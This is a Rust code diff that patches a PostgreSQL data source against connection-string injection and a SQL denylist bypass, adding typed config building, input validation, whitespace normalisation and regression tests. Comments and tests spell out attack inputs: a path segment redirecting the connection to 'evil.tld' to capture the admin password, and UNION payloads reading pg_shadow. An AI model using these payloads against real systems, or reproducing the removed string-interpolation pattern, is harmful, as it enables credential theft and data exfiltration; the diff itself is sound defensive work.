@@ -82,6 +82,39 @@ impl PostgresSource {
         }
     }
 
+    /// Reject a database name that isn't a plausible PostgreSQL identifier.
+    ///
+    /// The typed `Config` above already makes injection impossible; this
+    /// exists so a malformed segment fails fast with a clear message instead
+    /// of a confusing connection error, and so the same rule is enforced no
+    /// matter how a future caller builds its connection.
+    ///
+    /// Deliberately permissive about non-ASCII (PostgreSQL allows UTF-8
+    /// identifiers) while rejecting the characters that carry meaning in a
+    /// libpq keyword/value string: whitespace, `=`, `'` and `\`.
+    fn validate_database_identifier(name: &str) -> Result<()> {
+        if name.is_empty() {
+            return Err(DataError::InvalidQuery(
+                "Database name cannot be empty".to_string(),
+            ));
+        }
+        if name.len() > 63 {
+            return Err(DataError::InvalidQuery(format!(
+                "Database name is too long ({} bytes, max 63): {name}",
+                name.len()
+            )));
+        }
+        if let Some(bad) = name
+            .chars()
+            .find(|c| c.is_whitespace() || matches!(c, '=' | '\'' | '\\' | '\0'))
+        {
+            return Err(DataError::InvalidQuery(format!(
+                "Database name contains an illegal character {bad:?}: {name}"
+            )));
+        }
+        Ok(())
+    }
+
     /// Create a new PostgreSQL data source
     pub async fn connect(
         host: &str,
@@ -90,17 +123,40 @@ impl PostgresSource {
         password: &str,
         database: &str,
     ) -> Result<Self> {
-        let config = format!(
-            "host={} port={} user={} password={} dbname={}",
-            host, port, username, password, database
-        );
+        // SECURITY: build the config with typed setters, never `format!`.
+        //
+        // This used to interpolate into a libpq keyword/value string:
+        //
+        //     format!("host={host} port={port} user={user} password={pw} dbname={db}")
+        //
+        // `database` is the first segment of a browser URL path, unvalidated,
+        // and libpq strings are whitespace-separated key=value pairs where
+        // `host` *appends* rather than replaces. So a path segment of
+        // `nosuchdb host=evil.tld` produced a config listing a second host;
+        // tokio-postgres tries hosts in order and falls through when the first
+        // rejects the (nonexistent) database, handing the attacker-controlled
+        // server this service's admin password in cleartext — worse here
+        // because the TLS verifier accepts any certificate and there is a
+        // plaintext fallback below.
+        //
+        // `Config` setters take values, not syntax, so no segment can inject a
+        // parameter. The identifier check is belt-and-braces for the error
+        // messages and to reject nonsense early.
+        Self::validate_database_identifier(database)?;
+
+        let mut cfg = tokio_postgres::Config::new();
+        cfg.host(host)
+            .port(port)
+            .user(username)
+            .password(password)
+            .dbname(database);
 
         debug!(
             "Connecting to PostgreSQL: {}@{}:{}/{}",
             username, host, port, database
         );
 
-        let client = match Self::connect_with_tls(&config).await {
+        let client = match Self::connect_with_tls(&cfg).await {
             Ok(client) => {
                 debug!("Connected to PostgreSQL with TLS");
                 client
@@ -110,14 +166,13 @@ impl PostgresSource {
                     "TLS connection failed, falling back to plain connection: {}",
                     format_chain(&tls_err)
                 );
-                let (client, connection) =
-                    tokio_postgres::connect(&config, NoTls).await.map_err(|e| {
-                        DataError::ConnectionFailed(format!(
-                            "PostgreSQL connection failed (TLS error: {}, plain error: {})",
-                            format_chain(&tls_err),
-                            format_chain(&e),
-                        ))
-                    })?;
+                let (client, connection) = cfg.connect(NoTls).await.map_err(|e| {
+                    DataError::ConnectionFailed(format!(
+                        "PostgreSQL connection failed (TLS error: {}, plain error: {})",
+                        format_chain(&tls_err),
+                        format_chain(&e),
+                    ))
+                })?;
 
                 tokio::spawn(async move {
                     if let Err(e) = connection.await {
@@ -152,8 +207,10 @@ impl PostgresSource {
 
     /// Attempt a TLS connection using rustls configured to accept self-signed certificates.
     /// Returns the Client after spawning the connection task.
-    async fn connect_with_tls(config: &str) -> std::result::Result<Client, tokio_postgres::Error> {
-        connect_with_self_signed_tls(config).await
+    async fn connect_with_tls(
+        config: &tokio_postgres::Config,
+    ) -> std::result::Result<Client, tokio_postgres::Error> {
+        connect_with_self_signed_tls_config(config).await
     }
 }
 
@@ -184,8 +241,44 @@ fn format_chain<E: std::error::Error>(err: &E) -> String {
     out
 }
 
+/// Collapse every run of whitespace to a single ASCII space.
+///
+/// SQL lexers treat space, tab, newline, carriage return, form feed and
+/// vertical tab identically, so any keyword denylist that matches
+/// `"keyword "` must see normalised input or it can be stepped around with a
+/// different separator. Shared by the Postgres and MariaDB validators.
+pub fn normalize_sql_whitespace(sql: &str) -> String {
+    let mut out = String::with_capacity(sql.len());
+    let mut in_space = false;
+    for ch in sql.chars() {
+        if ch.is_whitespace() {
+            if !in_space {
+                out.push(' ');
+                in_space = true;
+            }
+        } else {
+            out.push(ch);
+            in_space = false;
+        }
+    }
+    out
+}
+
 pub async fn connect_with_self_signed_tls(
     config: &str,
+) -> std::result::Result<Client, tokio_postgres::Error> {
+    let parsed: tokio_postgres::Config = config.parse()?;
+    connect_with_self_signed_tls_config(&parsed).await
+}
+
+/// As [`connect_with_self_signed_tls`], but takes an already-built
+/// [`tokio_postgres::Config`].
+///
+/// Preferred whenever any component of the connection is caller-supplied: a
+/// `Config` carries values, so nothing in it can be mistaken for connection
+/// syntax the way an interpolated keyword/value string can.
+pub async fn connect_with_self_signed_tls_config(
+    config: &tokio_postgres::Config,
 ) -> std::result::Result<Client, tokio_postgres::Error> {
     // `ClientConfig::builder()` panics when no process-wide CryptoProvider
     // is installed AND the rustls features can't auto-pick one (e.g. both
@@ -203,7 +296,7 @@ pub async fn connect_with_self_signed_tls(
         .with_no_client_auth();
 
     let tls = MakeRustlsConnect::new(rustls_config);
-    let (client, connection) = tokio_postgres::connect(config, tls).await?;
+    let (client, connection) = config.connect(tls).await?;
 
     tokio::spawn(async move {
         if let Err(e) = connection.await {
@@ -513,7 +606,16 @@ impl PostgresSource {
         // Strip string literals to avoid false positives on content inside quotes
         // Lex case-sensitive dollar tags and quoted identifiers before
         // lowercasing the remaining SQL for keyword comparisons.
-        let without_strings = Self::strip_sql_string_literals(sql_trimmed)?.to_lowercase();
+        //
+        // SECURITY: collapse every whitespace run to a single space *before*
+        // the keyword checks below. The denylist matches literal prefixes like
+        // `"union "` / `"union\t"` / `"union\n"`, which meant any other
+        // separator PostgreSQL's lexer accepts slipped straight through —
+        // `false UNION\rSELECT …` matched nothing, contained no `;` or `(`,
+        // and so passed every structural check too. Normalising here means the
+        // list only ever has to know about one separator.
+        let without_strings =
+            normalize_sql_whitespace(&Self::strip_sql_string_literals(sql_trimmed)?).to_lowercase();
 
         // STRUCTURAL CHECKS: Block injection vectors that denylist alone cannot catch
 
@@ -620,10 +722,10 @@ impl PostgresSource {
             "update ",
             "delete ",
             "copy ",
-            // Set operations that enable data exfiltration
+            // Set operations that enable data exfiltration. One space suffices
+            // now that `normalize_sql_whitespace` runs first — previously this
+            // enumerated separators by hand and missed \r, \f and \v.
             "union ",
-            "union\t",
-            "union\n",
             "intersect ",
             "except ",
             // Dangerous PostgreSQL functions
@@ -1747,6 +1849,31 @@ mod tests {
         assert_sql_rejected("1=1 UNION SELECT * FROM users");
         assert_sql_rejected("1=1 union select password from users");
         assert_sql_rejected("id = 1 UNION\tSELECT * FROM secrets");
+    }
+
+    #[test]
+    fn test_sql_injection_union_with_exotic_whitespace() {
+        // The denylist used to enumerate separators literally ("union ",
+        // "union\t", "union\n"), so any other whitespace PostgreSQL's lexer
+        // accepts walked straight past it — no semicolon, no parenthesis, so
+        // every structural check passed too. This was full arbitrary-table
+        // exfiltration through a documented filter parameter.
+        assert_sql_rejected("false UNION\rSELECT usename, passwd FROM pg_shadow");
+        assert_sql_rejected("false UNION\u{000C}SELECT usename FROM pg_shadow");
+        assert_sql_rejected("false UNION\u{000B}SELECT usename FROM pg_shadow");
+        // Mixed and repeated separators must collapse to one too.
+        assert_sql_rejected("false UNION \r\n\t SELECT usename FROM pg_shadow");
+        assert_sql_rejected("1=1 INTERSECT\rSELECT 1");
+        assert_sql_rejected("1=1 EXCEPT\rSELECT 1");
+    }
+
+    #[test]
+    fn normalize_sql_whitespace_collapses_every_separator() {
+        assert_eq!(normalize_sql_whitespace("a\rb"), "a b");
+        assert_eq!(normalize_sql_whitespace("a\u{000C}b"), "a b");
+        assert_eq!(normalize_sql_whitespace("a \r\n\t b"), "a b");
+        // Non-whitespace is untouched, so ordinary clauses still validate.
+        assert_eq!(normalize_sql_whitespace("id = 1"), "id = 1");
     }
 
     #[test]
